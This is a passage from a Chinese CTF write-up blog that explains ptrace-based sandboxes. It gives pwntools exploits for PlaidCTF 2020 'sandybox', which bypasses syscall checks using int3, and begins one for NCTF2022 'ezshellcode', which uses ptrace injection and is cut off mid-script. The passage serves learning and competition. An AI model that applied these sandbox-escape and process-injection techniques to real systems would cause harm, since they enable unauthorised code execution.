<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(PTRACE_SYSCALL, v12, <span class="number">0LL</span>, v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = *__errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = strerror(v21);</span><br><span class="line">      __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;ptrace syscall1 %s\n&quot;</span>, v22);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( waitpid(v12, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)stat_loc != <span class="number">127</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;so long, sucker 0x%x\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = BYTE1(stat_loc);</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  __dprintf_chk(<span class="number">2LL</span>, <span class="number">1LL</span>, <span class="string">&quot;child signal %d\n&quot;</span>, BYTE1(stat_loc));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PTRACE_SYSCALL</code> 标志表示要执行的操作是单步执行系统调用。这意味着被跟踪的进程将在<strong><u>下一个</u></strong>系统调用发生时停止,并等待跟踪父进程接收通知。</p>
<p>信号5是 SIGTRAP 信号。SIGTRAP信号是一个特殊的信号，用于调试和跟踪进程的执行。用于通知目标进程停止执行，以便调试器可以执行相关操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(PTRACE_GETREGS, v12, <span class="number">0LL</span>, v30) )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = __errno_location();</span><br><span class="line">  v24 = strerror(*v23);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;ptrace getregs %s\n&quot;</span>, v24);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到所有的寄存器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_DA0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="keyword">struct</span> user_regs_struct *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 orig_ax; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 di; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  orig_ax = a2-&gt;orig_ax;</span><br><span class="line">  <span class="keyword">if</span> ( orig_ax != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax &gt; <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( orig_ax == <span class="number">37</span> )</span><br><span class="line">        <span class="keyword">return</span> a2-&gt;di - <span class="number">1</span> &gt; <span class="number">0x13</span>;</span><br><span class="line">      <span class="keyword">if</span> ( orig_ax &lt;= <span class="number">0x25</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( orig_ax &lt;= <span class="number">0xB</span> )</span><br><span class="line">          <span class="keyword">return</span> a2-&gt;si &gt; <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> orig_ax != <span class="number">60</span> &amp;&amp; orig_ax != <span class="number">231</span> &amp;&amp; orig_ax != <span class="number">39</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a2-&gt;si )</span><br><span class="line">      &#123;</span><br><span class="line">        di = a2-&gt;di;</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">0LL</span>;</span><br><span class="line">        v5 = ptrace(PTRACE_PEEKDATA, a1, di, <span class="number">0LL</span>);</span><br><span class="line">        v6 = ptrace(PTRACE_PEEKDATA, a1, a2-&gt;di + <span class="number">8</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">-1</span> &amp;&amp; v6 != <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)&amp;v7 = v5;</span><br><span class="line">          *((_QWORD *)&amp;v7 + <span class="number">1</span>) = v6;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7) &lt;= <span class="number">0xF</span></span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;proc&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;sys&quot;</span>) != <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax &gt;= <span class="number">2</span> &amp;&amp; orig_ax != <span class="number">3</span> &amp;&amp; orig_ax != <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是一个check</p>
<p><code>PTRACE_PEEKDATA</code> 标志表示进行读取进程信息,第三个参数是目标地址</p>
<p>这里对不少系统调用做了限制,逆向挺简单的,就不分析了</p>
<h2 id="int3绕过"><a href="#int3绕过" class="headerlink" title="int3绕过"></a>int3绕过</h2><p>且看man ptrace</p>
<blockquote>
<pre><code>   PTRACE_SYSCALL, PTRACE_SINGLESTEP
          Restart the stopped tracee as for PTRACE_CONT, but arrange for the tracee to be
          stopped  at the next entry to or exit from a system call, or after execution of
          a single instruction, respectively.   (The  tracee  will  also,  as  usual,  be
          stopped  upon  receipt of a signal.)  From the tracer&#39;s perspective, the tracee
          will  appear  to  have  been  stopped  by  receipt  of  a  SIGTRAP.   So,   for
          PTRACE_SYSCALL, for example, the idea is to inspect the arguments to the system
          call at the first stop, then do another PTRACE_SYSCALL and inspect  the  return
          value  of  the system call at the second stop.  The data argument is treated as
          for PTRACE_CONT.  (addr is ignored.)
</code></pre></blockquote>
<p>可以看到ptrace(PTRACE_SYSCALL,…)<u><strong>不仅会在进入syscall时停止,而且还会在退出时停止</strong></u></p>
<p>并且最重要的是其并<u>无法识别此时究竟是进入syscall还是退出syscall</u></p>
<p>那么如果我们颠倒检查的顺序,那么check的就是退出时候的寄存器,而真正进入syscall时却没有检查</p>
<p>至于如何做到就要利用<code>int 3</code>这个软中断,<code>int 3</code>我们都知道是用于调试目的的软件中断,当触发 <code>int 3</code> 中断的时候，调试器会捕获到这个中断，误以为此时是进入syscall,然后暂停程序的执行进行检查</p>
<p>exp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./sandybox&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 1000</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"><span class="comment"># Invoke int3 to invert the main tracer loop</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov rax, 8</span></span><br><span class="line"><span class="string">int3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># And now just read the flag file :)</span></span><br><span class="line">shellcode += asm(shellcraft.amd64.cat(<span class="string">&#x27;flag&#x27;</span>), arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/20115">CTFtime.org / PlaidCTF 2020 / sandybox / Writeup</a></p>
<h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231078">Linux沙箱入门——ptrace从0到1-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>在Linux系统中，进程状态除了我们所熟知的<code>TASK_RUNNING</code>，<code>TASK_INTERRUPTIBLE</code>，<code>TASK_STOPPED</code>等，还有一个<code>TASK_TRACED</code>，而<code>TASK_TRACED</code>将调试程序断点成为可能。</p>
<ol>
<li><strong>R (TASK_RUNNING)，可执行状态。</strong></li>
<li><strong>S (TASK_INTERRUPTIBLE)，可中断的睡眠状态。</strong></li>
<li><strong>D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态。</strong></li>
<li><strong>T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态。</strong></li>
</ol>
<p>当使用了ptrace跟踪后，<strong>所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程</strong>，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED，而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span></span>;</span><br></pre></td></tr></table></figure>
<p>一共有四个参数：</p>
<ul>
<li><code>request</code>: 表示要执行的操作类型。反调试会用到<code>PT_DENY_ATTACH</code>，调试会用到<code>PTRACE_ATTACH</code></li>
<li><code>pid</code>: 要操作的目标进程ID</li>
<li><code>addr</code>: 要监控的目标内存地址</li>
<li><code>data</code>: 保存读取出或者要写入的数据</li>
</ul>
<p>request常见的可能取值有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PTRACE_TRACEME = <span class="number">0</span>,        <span class="comment">//被调试进程调用</span></span><br><span class="line">    PTRACE_PEEKTEXT = <span class="number">1</span>， <span class="comment">//从内存addr处读取一个字节</span></span><br><span class="line">    PTRACE_PEEKDATA = <span class="number">2</span>,    <span class="comment">//查看内存addr处的一个字节</span></span><br><span class="line">    PTRACE_PEEKUSER = <span class="number">3</span>,    <span class="comment">//查看struct user 结构体的值</span></span><br><span class="line">    PTRACE_POKETEXT = <span class="number">4</span>， <span class="comment">//查看内存addr处一个字大小的内存（4字节）</span></span><br><span class="line">    PTRACE_POKEDATA = <span class="number">5</span>,    <span class="comment">//修改内存addr处一个字大小的内存（4字节）</span></span><br><span class="line">    PTRACE_POKEUSER = <span class="number">6</span>,    <span class="comment">//修改struct user结构体的值</span></span><br><span class="line">    PTRACE_CONT = <span class="number">7</span>,        <span class="comment">//被调试进程pid继续</span></span><br><span class="line">    PTRACE_SINGLESTEP = <span class="number">9</span>,    <span class="comment">//被调试进程pid执行一条汇编指令</span></span><br><span class="line">    PTRACE_GETREGS = <span class="number">12</span>,    <span class="comment">//获取寄存器(struct user_regs_struct)到内存data中</span></span><br><span class="line">    PTRACE_SETREGS = <span class="number">13</span>,    <span class="comment">//设置内存data上的数据为寄存器(struct user_regs_struct)</span></span><br><span class="line">    PTRACE_ATTACH = <span class="number">16</span>,        <span class="comment">//附加进程pid</span></span><br><span class="line">    PTRACE_DETACH = <span class="number">17</span>,        <span class="comment">//解除附加进程pid</span></span><br><span class="line">    PTRACE_SYSCALL = <span class="number">24</span>,    <span class="comment">//让被调试进程pid在下一次系统调用入口或出口停止</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">ptrace</span> <span class="params">(<span class="keyword">enum</span> __ptrace_request __request, ...)</span></span><br></pre></td></tr></table></figure>
<p><code>PTRACE_TRACEME</code>标志tracee表明自己想要被追踪，这会<u>自动与父进程建立</u>追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。</p>
<p>寄存器相关结构定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r15;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r14;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r13;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r12;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	bp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	bx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r11;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r10;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r9;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	r8;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	ax;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	cx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	dx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	si;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	di;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	orig_ax;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	ip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	cs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	sp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	ss;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	fs_base;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	gs_base;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	ds;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	es;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	fs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>还有配套的偏移值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">##/arch/x86/include/uapi/<span class="keyword">asm</span>/ptrace-abi.h</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R15 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R14 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R13 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R12 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RBP 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RBX 40</span></span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R11 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R10 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R9 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R8 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAX 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RCX 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RDX 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RSI 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RDI 112</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_RAX 120</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RIP 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CS 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFLAGS 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RSP 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SS 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __ASSEMBLY__ */</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FRAME_SIZE 168</span></span><br></pre></td></tr></table></figure>
<p>更多相关request可以看man手册或者内核源码</p>
<p>此外现在ptrace多了一些安全机制,即/proc/sys/kernel/yama/ptrace_scope</p>
<p>当该值被设置为1时，只能允许非特权用户ptrace跟踪自己的子进程</p>
<p>即使是属于自己的进程，如果不是子进程，仍然没有权限去attach，借此来实现一定程度上的避免ptrace进程注入</p>
<h1 id="NCTF2022-ezshellcode"><a href="#NCTF2022-ezshellcode" class="headerlink" title="NCTF2022-ezshellcode"></a>NCTF2022-ezshellcode</h1><p>题目很短</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = getpid();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pid: %d\n&quot;</span>, v3);</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x401000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v5 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">41LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">49LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">42LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">50LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v5);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行任意代码执行,但是关闭了0,1,2三个标准流</p>
<p>在ezthree这题中我们是通过socket通信来实现获取flag</p>
<p>但这题很贴心的去除了socket相关系统调用</p>
<p>不过却给了我们进程的pid,并且可以发现在Dockerfile中有这么一句</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure>
<p>关闭了ptrace特权保护</p>
<p>那么接下来的思路就很明确了,我们打开两个ezshellcode进程</p>
<p>其中A进程在得到其pid后阻塞在那,暂时不管</p>
<p>B进程则利用A的pid去ptrace注入A进程,并在读取完shellcode后,利用ptrace使得A进程直接跳转到shellcode处执行,跳过关闭0,1,2</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span 